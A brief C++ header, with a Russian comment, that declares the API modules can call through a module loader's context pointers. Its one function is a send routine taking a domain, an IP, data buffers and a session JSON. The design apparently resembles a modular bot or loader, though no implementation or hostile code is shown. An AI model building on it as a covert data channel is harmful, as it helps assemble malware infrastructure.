#pragma once

#include "global.hpp"
#include "..\..\common\module_data.hpp"

// тут апи модулей, которые они могут вызывать через указатели в контексте загрузчика модулей
namespace module_api
{

	module_data::send_status_t WINAPI send(PWCHAR pwchDomain, PWCHAR pwchIP, LPBYTE lpData, SIZE_T dwDataSize, LPBYTE *lpOutputBuffer, PSIZE_T dwOutputSize, PWCHAR pwchSessionJson, DWORD dwFileName);

}